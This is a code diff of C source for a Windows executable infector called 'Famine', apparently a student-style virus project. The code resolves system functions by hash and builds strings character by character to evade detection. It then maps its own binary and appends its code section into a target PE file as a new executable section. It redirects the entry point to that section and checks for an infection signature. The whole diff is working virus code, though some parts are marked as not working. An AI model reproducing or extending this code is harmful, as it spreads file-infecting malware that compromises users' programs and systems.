@@ -5,8 +5,9 @@
 #include "GetProcAddressWithHash.h"
 #include "famine.h"
 // #include <Windows.h> // only for types
+#define MAX_PATH 260
 
-void	*ft_memcpy(void *dst, const void *src, size_t n)
+ void	*memcpy(void *dst, const void *src, size_t n)
 {
 	size_t i;
 
@@ -19,6 +20,34 @@ void	*ft_memcpy(void *dst, const void *src, size_t n)
 		i++;
 	}
 	return (dst);
+}
+
+
+
+int ft_strncmp(const char *s1, const char *s2, unsigned int n)
+{
+    unsigned int i;
+
+    i = 0;
+    if (n == 0)
+        return (0);
+    while (s1[i] == s2[i] && s1[i] != '\0' && s2[i] != '\0' && i < n - 1)
+        i++;
+    return ((unsigned char)s1[i] - (unsigned char)s2[i]);
+}
+
+
+void	*memstr(char *s, const char *str, size_t n) {
+	size_t i;
+
+	i = 0;
+	while (i++ < n)
+	{
+		if (ft_strncmp((const char *)s, str, n) == 0)
+			return ((void *)s);
+		s++;
+	}
+	return (NULL);
 }
 
 DWORD align(DWORD size, DWORD align, DWORD addr)
@@ -54,263 +83,296 @@ typedef struct woody
 //         CloseHandle(injector->file_handle);
 // }
 
-BOOLEAN map_file(PCHAR pe_filename, woody *injector, PCHAR sc_filename)
-{
-    HANDLE hKernel32 = NULL;
-    LDRLOADDLL pLdrLoadDll = NULL;
-    LDRGETPROCADDRESS pLdrGetProcAddress = NULL;
-    CREATEFILEA pCreateFileA = NULL;
-    GETFILESIZE pGetFileSize = NULL;
-    CREATEFILEMAPPINGA pCreateFileMappingA = NULL;
-    MAPVIEWOFFILE pMapViewOfFile = NULL;
-    CLOSEHANDLE pCloseHandle = NULL;
 
+s_procedure_mapping procedure_map()
+{
+    s_procedure_mapping procedure_mapping;
     WCHAR sKernel32[] = { 'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l' };
+    UNICODE_STRING uString = { 0 };
+
+    procedure_mapping.error = TRUE;
 
     // Resolve LdrLoadDll and LdrGetProcAddress
-    pLdrLoadDll = GetProcAddressWithHash(LDRLOADDLL_HASH);
-    pLdrGetProcAddress = GetProcAddressWithHash(LDRGETPROCADDRESS_HASH);
-
-    if (!pLdrLoadDll || !pLdrGetProcAddress)
+    procedure_mapping.pLdrLoadDll = GetProcAddressWithHash(LDRLOADDLL_HASH);
+    procedure_mapping.pLdrGetProcAddress = GetProcAddressWithHash(LDRGETPROCADDRESS_HASH);
+    if (!procedure_mapping.pLdrLoadDll || !procedure_mapping.pLdrGetProcAddress)
     {
         ERROR_SYS("GetProcAddress");
-        return FALSE;
+        return procedure_mapping;
     }
 
     // Load kernel32.dll
-    UNICODE_STRING uString = { 0 };
     uString.Buffer = sKernel32;
     uString.Length = sizeof(sKernel32);
     uString.MaximumLength = sizeof(sKernel32);
 
-    pLdrLoadDll(NULL, 0, &uString, &hKernel32);
-    if (!hKernel32)
+    procedure_mapping.pLdrLoadDll(NULL, 0, &uString, &procedure_mapping.hKernel32);
+    if (!procedure_mapping.hKernel32)
     {
         ERROR_SYS("LdrLoadDll");
-        return FALSE;
+        return procedure_mapping;
     }
 
-    // Get function pointers for kernel32.dll functions
-    pCreateFileA = (CREATEFILEA)GetProcAddressWithHash(CREATEFILEA_HASH);
-    pGetFileSize = (GETFILESIZE)GetProcAddressWithHash(GETFILESIZE_HASH);
-    pCreateFileMappingA = (CREATEFILEMAPPINGA)GetProcAddressWithHash(CREATEFILEMAPPINGA_HASH);
-    pMapViewOfFile = (MAPVIEWOFFILE)GetProcAddressWithHash(MAPVIEWOFFILE_HASH);
-    pCloseHandle = (CLOSEHANDLE)GetProcAddressWithHash(CLOSEHANDLE_HASH);
+    procedure_mapping.pCreateFileA = (CREATEFILEA)GetProcAddressWithHash(CREATEFILEA_HASH);
+    procedure_mapping.pGetFileSize = (GETFILESIZE)GetProcAddressWithHash(GETFILESIZE_HASH);
+    procedure_mapping.pCreateFileMappingA = (CREATEFILEMAPPINGA)GetProcAddressWithHash(CREATEFILEMAPPINGA_HASH);
+    procedure_mapping.pMapViewOfFile = (MAPVIEWOFFILE)GetProcAddressWithHash(MAPVIEWOFFILE_HASH);
+    procedure_mapping.pCloseHandle = (CLOSEHANDLE)GetProcAddressWithHash(CLOSEHANDLE_HASH);
+    procedure_mapping.pGetModuleFileNameA = (GETMODULEFILENAMEA)GetProcAddressWithHash(GETMODULEFILENAMEA_HASH);
 
-    if (!pCreateFileA || !pGetFileSize || !pCreateFileMappingA || !pMapViewOfFile || !pCloseHandle)
+    if (!procedure_mapping.pCreateFileA || !procedure_mapping.pGetFileSize || !procedure_mapping.pCreateFileMappingA
+    || !procedure_mapping.pMapViewOfFile || !procedure_mapping.pCloseHandle || !procedure_mapping.pGetModuleFileNameA)
     {
         ERROR_SYS("GetProcAddress for kernel32");
-        return FALSE;
+        return procedure_mapping;
     }
 
-    // Use the dynamically retrieved functions to handle the file
-    injector->file_handle = pCreateFileA(pe_filename, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-    if (injector->file_handle == INVALID_HANDLE_VALUE)
+    procedure_mapping.error = FALSE;
+    return procedure_mapping;
+}
+
+s_file_mapping map_file(PCHAR path, s_procedure_mapping proc, BOOLEAN write)
+{
+    s_file_mapping file_mapping;
+    file_mapping.error = TRUE;
+    DWORD access;
+
+    if (write)
+        access = GENERIC_WRITE | GENERIC_READ;
+    else
+        access = GENERIC_READ;
+
+
+    file_mapping.file_handle = proc.pCreateFileA(path, access, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (file_mapping.file_handle == INVALID_HANDLE_VALUE)
     {
         ERROR_SYS("CreateFileA");
-        return FALSE;
+        return file_mapping;
     }
 
-    injector->file_size = pGetFileSize(injector->file_handle, NULL);
-    if (injector->file_size == INVALID_FILE_SIZE)
+    file_mapping.file_size = proc.pGetFileSize(file_mapping.file_handle, NULL);
+    if (file_mapping.file_size == INVALID_FILE_SIZE)
     {
         ERROR_SYS("GetFileSize");
         // clean_woody(injector);
-        return FALSE;
+        return file_mapping;
     }
 
-    injector->file_mapping = pCreateFileMappingA(injector->file_handle, NULL, PAGE_READWRITE, 0, injector->file_size, NULL);
-    if (!injector->file_mapping)
+    if (write)
+        access = PAGE_READWRITE;
+    else
+        access = PAGE_READONLY;
+    
+
+    file_mapping.file_mapping = proc.pCreateFileMappingA(file_mapping.file_handle, NULL, access, 0, file_mapping.file_size, NULL);
+    if (!file_mapping.file_mapping)
     {
         ERROR_SYS("CreateFileMappingA");
         // clean_woody(injector);
-        return FALSE;
+        return file_mapping;
     }
 
-    injector->file_view = pMapViewOfFile(injector->file_mapping, FILE_MAP_ALL_ACCESS, 0, 0, injector->file_size);
-    if (!injector->file_view)
+    if (write)
+        access = FILE_MAP_ALL_ACCESS;
+    else
+        access = FILE_MAP_READ;
+
+    file_mapping.file_view = proc.pMapViewOfFile(file_mapping.file_mapping, access, 0, 0, file_mapping.file_size);
+    if (!file_mapping.file_view)
     {
         ERROR_SYS("MapViewOfFile");
         // clean_woody(injector);
-        return FALSE;
+        return file_mapping;
     }
 
-    // read shellcode from file path
-    HANDLE hFile = pCreateFileA(sc_filename, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-    if (hFile == INVALID_HANDLE_VALUE)
-    {
-        ERROR_SYS("CreateFileA");
-        // clean_woody(injector);
-        return FALSE;
-    }
-
-    injector->shellcode_size = pGetFileSize(hFile, NULL);
-    if (injector->shellcode_size == INVALID_FILE_SIZE)
-    {
-        ERROR_SYS("GetFileSize");
-        // clean_woody(injector);
-        return FALSE;
-    }
-
-    // Create a file mapping object
-    HANDLE hFileMapping = pCreateFileMappingA(hFile, NULL, PAGE_READWRITE, 0, injector->shellcode_size, NULL);
-    if (!hFileMapping)
-    {
-        ERROR_SYS("CreateFileMappingA");
-        return FALSE;
-    }
-
-    injector->shellcode = (char *)pMapViewOfFile(hFileMapping, FILE_MAP_ALL_ACCESS, 0, 0, injector->shellcode_size);
-    if (!injector->shellcode)
-    {
-        ERROR_SYS("MapViewOfFile");
-        // clean_woody(injector);
-        return FALSE;
-    }
-
-
-
-
-    // CloseHandle(hFile);
-
-    return TRUE;
+    file_mapping.error = FALSE;
+    return file_mapping;
 }
 
 
-BOOLEAN read_pe_header(woody *injector)
+t_pe read_pe_header(s_file_mapping pe_map)
 {
-    PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)injector->file_view;
+    t_pe pe;
+    pe.error = TRUE;
+
+    PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)pe_map.file_view;
     if (dos_header->e_magic != IMAGE_DOS_SIGNATURE)
     {
         ERROR_SYS("Invalid DOS signature");
-        return FALSE;
+        return pe;
     }
 
-    injector->nt_headers = (PIMAGE_NT_HEADERS)((BYTE *)injector->file_view + dos_header->e_lfanew);
-    if (injector->nt_headers->Signature != IMAGE_NT_SIGNATURE)
+    pe.nt_headers = (PIMAGE_NT_HEADERS)((BYTE *)pe_map.file_view + dos_header->e_lfanew);
+    if (pe.nt_headers->Signature != IMAGE_NT_SIGNATURE)
     {
         ERROR_SYS("Invalid NT signature");
-        return FALSE;
+        return pe;
     }
 
-    if (injector->nt_headers->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64)
+    if (pe.nt_headers->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64)
     {
         ERROR_SYS("Unsupported architecture (64-bit only)");
-        return FALSE;
+        return pe;
     }
 
-    if (!(injector->nt_headers->FileHeader.Characteristics & IMAGE_FILE_EXECUTABLE_IMAGE))
+    if (!(pe.nt_headers->FileHeader.Characteristics & IMAGE_FILE_EXECUTABLE_IMAGE))
     {
         ERROR_SYS("File is not executable");
-        return FALSE;
+        return pe;
     }
 
-    injector->number_of_sections = injector->nt_headers->FileHeader.NumberOfSections;
-    injector->section_headers = IMAGE_FIRST_SECTION(injector->nt_headers);
-
-    return TRUE;
+    pe.number_of_sections = pe.nt_headers->FileHeader.NumberOfSections;
+    pe.section_headers = IMAGE_FIRST_SECTION(pe.nt_headers);
+    pe.error = FALSE;
+    return pe;
 }
 
-VOID inject_shellcode(woody *injector)
+PIMAGE_SECTION_HEADER get_section_by_name(s_file_mapping file_mapping)
 {
-    char section_name[SECTION_NAME_SIZE];
-    section_name[0] = '.';
-    section_name[1] = 'w';
-    section_name[2] = 'o';
-    section_name[3] = 'o';
-    section_name[4] = 'd';
-    section_name[5] = 'y';
-    section_name[6] = '\0';  // Null terminator for safety
-    section_name[7] = '\0';  // Padding to complete 8 bytes
+    char famine_section_name[] = {'.', 'f', 'a', 'm', 'i', 'n', 'e', 0};
+    char text_section_name[] = {'.', 't', 'e', 'x', 't', 0, 0, 0};
 
+    PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)file_mapping.file_view;
+    PIMAGE_NT_HEADERS nt_headers = (PIMAGE_NT_HEADERS)((BYTE *)file_mapping.file_view + dos_header->e_lfanew);
+    PIMAGE_SECTION_HEADER section_headers = IMAGE_FIRST_SECTION(nt_headers);
 
-    PIMAGE_SECTION_HEADER new_section;
-    DWORD file_alignment, section_alignment;
-    DWORD new_section_rva, new_section_raw_size, new_section_virtual_size;
-
-    // Save the original entry point
-    DWORD original_entry_point = injector->nt_headers->OptionalHeader.AddressOfEntryPoint;
-
-    // Proceed with injecting the shellcode
-    new_section = &injector->section_headers[injector->number_of_sections];
-
-    ft_memcpy(new_section->Name, section_name, SECTION_NAME_SIZE);
-
-    file_alignment = injector->nt_headers->OptionalHeader.FileAlignment;
-    section_alignment = injector->nt_headers->OptionalHeader.SectionAlignment;
-
-    new_section_rva = align(injector->section_headers[injector->number_of_sections - 1].Misc.VirtualSize,
-                            section_alignment,
-                            injector->section_headers[injector->number_of_sections - 1].VirtualAddress);
-
-    new_section->VirtualAddress = new_section_rva;
-    new_section_virtual_size = align(injector->shellcode_size, section_alignment, 0);
-    new_section->Misc.VirtualSize = new_section_virtual_size;
-    new_section_raw_size = align(injector->shellcode_size, file_alignment, 0);
-    new_section->SizeOfRawData = new_section_raw_size;
-    new_section->PointerToRawData = align(injector->section_headers[injector->number_of_sections - 1].SizeOfRawData,
-                                          file_alignment,
-                                          injector->section_headers[injector->number_of_sections - 1].PointerToRawData);
-    new_section->Characteristics = IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_CNT_CODE;
-
-    injector->nt_headers->OptionalHeader.SizeOfImage = new_section_rva + new_section_virtual_size;
-    injector->nt_headers->FileHeader.NumberOfSections++;
-
-    // Copy the shellcode into the new section
-    ft_memcpy((BYTE *)injector->file_view + new_section->PointerToRawData, injector->shellcode, injector->shellcode_size);
-
-    injector->file_size += new_section_raw_size;
-
-    // Modify entry point to point to our new section
-    injector->nt_headers->OptionalHeader.AddressOfEntryPoint = new_section_rva;
-
-}
-
-VOID inject_shellcode_pe(WCHAR *target, PCHAR sc_filename)
-{
-    woody injector;
-    injector.target = target;
-
-    if (!map_file(target, &injector, sc_filename))
-        return;
-
-    if (!read_pe_header(&injector))
+    // First, look for .famine section
+    for (WORD i = 0; i < nt_headers->FileHeader.NumberOfSections; i++)
     {
-        // clean_woody(&injector);
+        if (ft_strncmp(section_headers[i].Name, famine_section_name, SECTION_NAME_SIZE) == 0)
+            return &section_headers[i];
+    }
+
+    // If .famine is not found, look for .text section
+    for (WORD i = 0; i < nt_headers->FileHeader.NumberOfSections; i++)
+    {
+        if (ft_strncmp(section_headers[i].Name, text_section_name, SECTION_NAME_SIZE) == 0)
+            return &section_headers[i];
+    }
+
+    // If neither section is found, return NULL
+    return NULL;
+}
+
+
+VOID inject_shellcode(s_file_mapping itself_map, s_file_mapping target_map)
+{
+    t_pe pe;
+    char section_name[] = {'.', 'f', 'a', 'm', 'i', 'n', 'e', 0};
+
+    // Retrieve the .text section from the 'itself' file (shellcode)
+    PIMAGE_SECTION_HEADER itself_section = get_section_by_name(itself_map);
+    if (!itself_section)
+    {
+        ERROR_SYS("Itself section not found");
         return;
     }
 
-    inject_shellcode(&injector);
+    // Read the target PE headers
+    pe = read_pe_header(target_map);
+    if (pe.error)
+    {
+        ERROR_SYS("Read PE header");
+        return;
+    }
 
-    // clean_woody(&injector);
+    // Get alignments from the target PE file headers
+    DWORD file_alignment = pe.nt_headers->OptionalHeader.FileAlignment;
+    DWORD section_alignment = pe.nt_headers->OptionalHeader.SectionAlignment;
+
+    // Calculate the new section's RVA (Relative Virtual Address)
+    DWORD new_section_rva = align(pe.section_headers[pe.number_of_sections - 1].VirtualAddress +
+                                  pe.section_headers[pe.number_of_sections - 1].Misc.VirtualSize,
+                                  section_alignment, 0);
+
+    // Calculate the new section's raw size and virtual size
+    DWORD new_section_virtual_size = align(itself_section->Misc.VirtualSize, section_alignment, 0);
+    DWORD new_section_raw_size = align(itself_section->SizeOfRawData, file_alignment, 0);
+
+    // Setup the new section with calculated values
+    PIMAGE_SECTION_HEADER new_section = &pe.section_headers[pe.number_of_sections];
+    memcpy(new_section->Name, section_name, sizeof(section_name));
+    new_section->VirtualAddress = new_section_rva;
+    new_section->Misc.VirtualSize = new_section_virtual_size;
+    new_section->SizeOfRawData = new_section_raw_size;
+
+    new_section->PointerToRawData = align(pe.section_headers[pe.number_of_sections - 1].PointerToRawData +
+                                          pe.section_headers[pe.number_of_sections - 1].SizeOfRawData,
+                                          file_alignment, 0);
+
+    // Set the section's characteristics (e.g., executable and readable)
+    new_section->Characteristics = IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_CNT_CODE;
+
+    // Update the number of sections and size of the image
+    pe.nt_headers->OptionalHeader.SizeOfImage = new_section_rva + new_section_virtual_size;
+    pe.nt_headers->FileHeader.NumberOfSections++;
+
+    // Copy the shellcode from 'itself' to the new section in the target
+    memcpy((BYTE *)target_map.file_view + new_section->PointerToRawData,
+              (BYTE *)itself_map.file_view + itself_section->PointerToRawData,
+              itself_section->Misc.VirtualSize);
+
+    // Correct way to set the new entry point
+    DWORD old_entry_point = pe.nt_headers->OptionalHeader.AddressOfEntryPoint;
+    pe.nt_headers->OptionalHeader.AddressOfEntryPoint = new_section_rva;
+
+    // Patch the shellcode with the old entry point
+    DWORD *shellcode_entry = (DWORD *)((BYTE *)target_map.file_view + new_section->PointerToRawData);
+    *shellcode_entry = old_entry_point;
+
+    // Expand the file size to account for the new section
+    target_map.file_size += new_section_raw_size;
+}
+
+
+BOOLEAN is_infected(s_file_mapping file_mapping)
+{
+    char SIGNATURE[] = {'F', 'a', 'm', 'i', 'n', 'e', ' ', 'b', 'y', ' ', 'W', 'o', 'o', 'd', 'y', 0};
+    const char *file_content = (const char *)file_mapping.file_view;
+
+    if(memstr(file_content, SIGNATURE, sizeof(SIGNATURE)))
+        return TRUE;
+
+    return FALSE;
+}
+
+
+VOID inject_shellcode_pe(PCHAR target)
+{
+    char exePath[MAX_PATH];
+    s_procedure_mapping proc;
+    s_file_mapping itself_map;
+    s_file_mapping target_map;
+
+    proc = procedure_map(target);
+    if (proc.error) return ;
+
+    DWORD pathlen = proc.pGetModuleFileNameA(NULL, exePath, MAX_PATH);
+    if (pathlen == 0) return ;
+
+    itself_map = map_file(exePath, proc, FALSE);
+    if (itself_map.error) return ;
+
+    target_map = map_file(target, proc, TRUE);
+    if (target_map.error) return ;
+
+    if (is_infected(target_map)) // dont work
+        return;
+
+    inject_shellcode(itself_map, target_map);
 }
 
 VOID Run(VOID)
 {
     #pragma warning( push )
     #pragma warning( disable : 4055 ) // Ignore cast warnings
-    
-    char test[5];
-    test[0] = 'c';
-    test[1] = '.';
-    test[2] = 'e';
-    test[3] = 'x';
-    test[4] = 'e';
-    test[5] = '\0';
 
-    char shellcode[6];
-    shellcode[0] = 't';
-    shellcode[1] = '.';
-    shellcode[2] = 'b';
-    shellcode[3] = 'i';
-    shellcode[4] = 'n';
-    shellcode[5] = '\0';
-
-    inject_shellcode_pe(test, shellcode);
+    char target[] = {'t', 'e', 's', 't', '.', 'e', 'x', 'e', 0};
+    inject_shellcode_pe(target);
 }
 
-int main(int argc, char *argv[])
-{
-    Run();
-    return 0;
-}
+// int main()
+// {
+//     Run();
+//     return 0;
+// }
